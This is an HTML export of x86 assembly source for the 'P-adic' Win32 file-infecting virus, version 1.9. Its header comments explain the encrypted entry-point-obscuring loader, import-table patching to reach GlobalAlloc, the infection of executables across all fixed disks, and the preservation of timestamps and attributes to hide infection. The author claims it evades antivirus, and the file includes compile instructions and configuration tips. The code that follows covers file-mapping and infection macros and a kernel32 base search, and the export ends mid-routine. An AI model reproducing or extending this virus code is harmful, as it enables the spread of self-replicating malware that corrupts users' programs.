<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc1">; comment $</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  P-adic virus version 1.9</span><span class="sc0">
</span><span class="sc1">;  by Doxtor L. /[T.I] ,2000-2002</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  Disclaimer:</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  This program is a virus.</span><span class="sc0">
</span><span class="sc1">;  It's not designed to be a destructive one, but anyway it's a virus !</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Description:</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  It's a per-process encrypted EPO win32 virus.</span><span class="sc0">
</span><span class="sc1">;  Tested both on Win95 and Win2K.</span><span class="sc0">
</span><span class="sc1">;  It's old style and new style bound aware so the applications</span><span class="sc0">
</span><span class="sc1">;  as calc.exe and notepad.exe on Win9x and Win2K will not</span><span class="sc0">
</span><span class="sc1">;  crash if they are infected!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  This virus uses several technics:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Checksum routine to recognize api strings in the export section </span><span class="sc0">
</span><span class="sc1">;  of the Kernel32.dll</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Whenever the size of the virus is less than the size of the relocation</span><span class="sc0">
</span><span class="sc1">;  section, if this latter do exist then this section is renamed</span><span class="sc0">
</span><span class="sc1">;  and the virus is placed there.</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  This virus uses a basic EPO routine.</span><span class="sc0">
</span><span class="sc1">;  A short piece of code overwrites the original entry  point of the host</span><span class="sc0">
</span><span class="sc1">;  so the entry point isn't modified.</span><span class="sc0">
</span><span class="sc1">;  The bytes overwritten are saved somewhere in the virus body.</span><span class="sc0">
</span><span class="sc1">;  Obviously, Before to jump to the host code these bytes are restored.</span><span class="sc0">
</span><span class="sc1">;  Pure overwritter viruses are lame, never forget that!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  The  main feature is that the sections attributes of the host aren't modified,</span><span class="sc0">
</span><span class="sc1">;  i.e if a section is a non-writable one, after infection the section attribute</span><span class="sc0">
</span><span class="sc1">;  is still non-writable.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  How we do that?</span><span class="sc0">
</span><span class="sc1">;  There are two technics used. The first one is the use of the api GlobalAlloc.</span><span class="sc0">
</span><span class="sc1">;  This api is called first, to create a memory space to decrypt and run the </span><span class="sc0">
</span><span class="sc1">;  main part of the virus there. But we need a special routine to get the address </span><span class="sc0">
</span><span class="sc1">;  of this api.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  In order to perform this task we search in the Import table of the target,</span><span class="sc0">
</span><span class="sc1">;  an api name with 11 or more letters.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  We patch the name with the "GlobalAlloc" string.</span><span class="sc0">
</span><span class="sc1">;  At run time, the infected host is loaded in memory by windows, the address</span><span class="sc0">
</span><span class="sc1">;  of the GlobalAlloc api is set. Windows makes the job for us :)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Nevetheleast, we need to restore the correct address.</span><span class="sc0">
</span><span class="sc1">;  GetProcAddress api is used.(we can't pre-calculate a checksum for it</span><span class="sc0">
</span><span class="sc1">;  because the name of this api isn't known before infection time)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  The virus uses the allocated memory space to move to and to decrypt its main routine.</span><span class="sc0">
</span><span class="sc1">;  So when the decryption process is over, the virus jumps to that new memory space.</span><span class="sc0">
</span><span class="sc1">;  It creates an infectious thread and returns to host.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  the infectious routine is a classic one:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   -It searchs targets on all fixed disks and then infects them.</span><span class="sc0">
</span><span class="sc1">;   -The thread begins with a pause, the virus stops few seconds before to infect.</span><span class="sc0">
</span><span class="sc1">;   -The virus is composed of 2 parts: a loading routine to create memory space</span><span class="sc0">
</span><span class="sc1">;    and decrypt the virus there (this routine is located in the executable section</span><span class="sc0">
</span><span class="sc1">;    of the host) and the main part of the virus, located in last section.</span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  This virus isn't detected by major anti-viruses at the time it was written.</span><span class="sc0">
</span><span class="sc1">;  So BE CAREFUL!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  To compile, use the following file:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Syntax is:   compile virus (and not "compile virus.asm")</span><span class="sc0">
</span><span class="sc1">;  [assuming the virus source code is named: virus.asm]</span><span class="sc0">
</span><span class="sc1">;  The assembler used is tasm 5.0</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ///// begin of compile.bat /////</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; tasm32 /m /ml %1.asm</span><span class="sc0">
</span><span class="sc1">; tlink32 /Tpe /aa /c %1,%1.exe,,import32.lib</span><span class="sc0">
</span><span class="sc1">; rem pewrite.exe set the write attribute in all sections headers</span><span class="sc0">
</span><span class="sc1">; pewrite %1.exe</span><span class="sc0">
</span><span class="sc1">; del %1.obj</span><span class="sc0">
</span><span class="sc1">; del %1.map</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ///// End of compile.bat /////</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Options:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  You can set the virus sleeping time, just change the </span><span class="sc0">
</span><span class="sc1">;  constant value called Miliseconds (see the end of the source code)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  To infect 10 files by loop (for example), set the value of the constant </span><span class="sc0">
</span><span class="sc1">;  "HowMany" to 10 (see the end). But i don't recommand the use of</span><span class="sc0">
</span><span class="sc1">;   numbers greater than 3. A lot of disk accesses could be suspicious</span><span class="sc0">
</span><span class="sc1">;   for the users and increase the rate of corrupted files when the user</span><span class="sc0">
</span><span class="sc1">;   closes the infected program before the infectious routine is terminated.</span><span class="sc0">
</span><span class="sc1">; $</span><span class="sc0">

</span><span class="sc9">%out</span><span class="sc0"> </span><span class="sc5">WARNING</span><span class="sc0">!
</span><span class="sc9">%out</span><span class="sc0"> </span><span class="sc5">YOU</span><span class="sc0"> </span><span class="sc5">HAVE</span><span class="sc0"> </span><span class="sc5">JUST</span><span class="sc0"> </span><span class="sc5">COMPILED</span><span class="sc0"> </span><span class="sc5">A</span><span class="sc0"> </span><span class="sc5">FULL</span><span class="sc0"> </span><span class="sc5">FUNCTIONNAL</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0">!
</span><span class="sc9">%out</span><span class="sc0"> </span><span class="sc5">ERASE</span><span class="sc0"> </span><span class="sc5">IT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">YOU</span><span class="sc0"> </span><span class="sc5">DON</span><span class="sc12">'T KNOW WHAT YOU'</span><span class="sc5">RE</span><span class="sc0"> </span><span class="sc5">DOING</span><span class="sc0">!

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">                 </span><span class="sc1">;only for the 1st generation</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">            </span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0"> 

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">T</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Warning!"</span><span class="sc0">              </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Message</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Ready to be infected"</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"by P-adic "</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"virus v 1.9 /[T.I] ?"</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Message2</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Exit infection?"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Krl32</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"KERNEL32.DLL"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EP</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"ExitProcess"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;only for 1st generation </span><span class="sc0">
</span><span class="sc5">EpAdd</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">;fake variable for 1st generation </span><span class="sc0">

</span><span class="sc1">;macros:</span><span class="sc0">
 </span><span class="sc5">OpenFileStuff</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">              </span><span class="sc1">;Read and Code abilities</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FileName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">                     
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CreateFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;save FileHandle </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CreateFileMappingA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_MapViewOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitOpenFileStuffError</span><span class="sc0">       
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;eax=Address of Mapping</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">   
        </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc9">endm</span><span class="sc0">        

 </span><span class="sc5">CloseFileStuff</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">
 </span><span class="sc5">UnMap</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_UnmapViewOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc5">CloseMapHandle</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc5">ResizeFile</span><span class="sc4">:</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_SetFilePointer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  
        
 </span><span class="sc5">MarkEndOfFile</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_SetEndOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0"> 

</span><span class="sc5">RestoreTime</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">LastWriteTime</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">LastAccessTime</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CreationTime</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_SetFileTime</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">


 </span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">                 
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc5">RestoreFileAttributs</span><span class="sc4">:</span><span class="sc0"> 

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileAttributes</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FileName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_SetFileAttributesA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">                                   </span><span class="sc1">;code executable starts here</span><span class="sc0">


</span><span class="sc5">HOST</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Over</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">60000</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">T</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Message2</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc5">Over</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">LoaderLength</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">EndVir</span><span class="sc4">-</span><span class="sc5">BeginVir</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">T</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Message</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Krl32</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EP</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">

</span><span class="sc1">;useless , but needed for 1st generation</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EpAdd</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">Import</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">EpAdd</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HackAdd</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EpAdd</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">EndVir</span><span class="sc4">-</span><span class="sc5">BeginVir</span><span class="sc0">

</span><span class="sc1">;[real start of virus]:</span><span class="sc0">

</span><span class="sc5">BeginVir</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc0">

 </span><span class="sc5">Delta</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;compute delta offset</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">       
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc0">

</span><span class="sc5">ComputeKernelAddress</span><span class="sc4">:</span><span class="sc0">


         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">       </span><span class="sc1">;mov edx,dword [Import]</span><span class="sc0">
         </span><span class="sc9">Import</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;Import is an address in Import table</span><span class="sc0">
                          </span><span class="sc1">;[ ]= adress of GlobalAlloc (in second generation)</span><span class="sc0">

</span><span class="sc1">;***** Search kernel32.dll address in memory</span><span class="sc0">
</span><span class="sc1">;      In :edx=address in kernel32</span><span class="sc0">
</span><span class="sc1">;***** Out:edx=kernel32.dll address</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

 </span><span class="sc6">Loop</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc6">Loop</span><span class="sc0">

 </span><span class="sc5">MZ_found</span><span class="sc4">:</span><span class="sc0">

